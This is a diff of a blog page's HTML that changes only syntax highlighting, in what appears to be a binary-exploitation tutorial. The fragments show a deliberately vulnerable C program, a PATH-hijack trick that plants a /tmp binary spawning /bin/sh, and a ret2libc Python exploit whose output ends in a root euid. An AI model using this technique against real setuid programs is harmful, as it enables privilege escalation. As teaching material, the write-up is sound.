@@ -168,7 +168,7 @@
 	  <div class="article_body">
 	  <h1 id="1-surroundings">1. Surroundings</h1>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>uname <span class="nt">-a</span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
 Linux debian 3.16.0-4-amd64 <span class="c">#1 SMP Debian 3.16.39-1+deb8u2 (2017-03-07) x86_64 GNU/Linux</span>
 
 <span class="nv">$ </span>lsb_release <span class="nt">-a</span>
@@ -193,8 +193,8 @@ GNU C Library <span class="o">(</span>Debian GLIBC 2.19-18+deb8u7<span class="o"
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
 </span>
-<span class="c1">// gcc main.c -z execstack -fno-stack-protector -m32
-</span>
+<span class="c1">// gcc main.c -z execstack -fno-stack-protector -m32</span>
+
 <span class="kt">void</span> <span class="nf">print_name</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
@@ -282,7 +282,7 @@ To remind:</p>
 
 <p>No more or less! After did it, we set the correct right to the file and we add “/tmp” repertory to the $PATH environment variable:</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod 777 /tmp/_gmon_start__ <span class="o">&amp;&amp;</span> <span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/tmp
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod </span>777 /tmp/_gmon_start__ <span class="o">&amp;&amp;</span> <span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/tmp
 </code></pre></div></div>
 
 <p>As you might understand, we will execute a command we’ve create, named “_gmon_start__” which will execute a /bin/sh.</p>
@@ -319,20 +319,20 @@ To remind:</p>
 <p>We can now write our exploit!</p>
 
 <h1 id="5-the-exploit">5. The exploit</h1>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
-<span class="c"># coding: utf-8</span>
-
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+# coding: utf-8
+</span>
 <span class="kn">import</span> <span class="nn">struct</span>
 <span class="kn">import</span> <span class="nn">subprocess</span>
 
-<span class="n">base</span> <span class="o">=</span> <span class="mh">0xf756e000</span>           <span class="c"># base libc address's</span>
-<span class="n">system_offset</span> <span class="o">=</span> <span class="mh">0x0003e3e0</span>  <span class="c"># system offset function</span>
-<span class="n">exit_offset</span> <span class="o">=</span> <span class="mh">0x000311b0</span>    <span class="c"># exit offset function</span>
-<span class="n">binsh</span> <span class="o">=</span>  <span class="mh">0x804825c</span>          <span class="c"># string addresse's (_gmon_start__)</span>
-
-<span class="n">system_addr</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">system_offset</span> <span class="c"># final system address's</span>
-<span class="n">exit_addr</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">exit_offset</span>     <span class="c"># final exit address's</span>
-
+<span class="n">base</span> <span class="o">=</span> <span class="mh">0xf756e000</span>           <span class="c1"># base libc address's
+</span><span class="n">system_offset</span> <span class="o">=</span> <span class="mh">0x0003e3e0</span>  <span class="c1"># system offset function
+</span><span class="n">exit_offset</span> <span class="o">=</span> <span class="mh">0x000311b0</span>    <span class="c1"># exit offset function
+</span><span class="n">binsh</span> <span class="o">=</span>  <span class="mh">0x804825c</span>          <span class="c1"># string addresse's (_gmon_start__)
+</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">system_offset</span> <span class="c1"># final system address's
+</span><span class="n">exit_addr</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">exit_offset</span>     <span class="c1"># final exit address's
+</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">76</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span><span class="n">system_addr</span><span class="p">)</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span><span class="n">exit_addr</span><span class="p">)</span>
@@ -360,8 +360,8 @@ KO
 
 KO
 
-<span class="nv">$ </span>id
-<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>
+<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>
 </code></pre></div></div>
 
 <p>Done.</p>
@@ -391,7 +391,7 @@ KO
 			 
 				<li>
 					<a href="/tags.html#pwn-ref">
-					pwn <span>(10)</span>
+					pwn <span>(11)</span>
 					
 					</a>
 				</li>
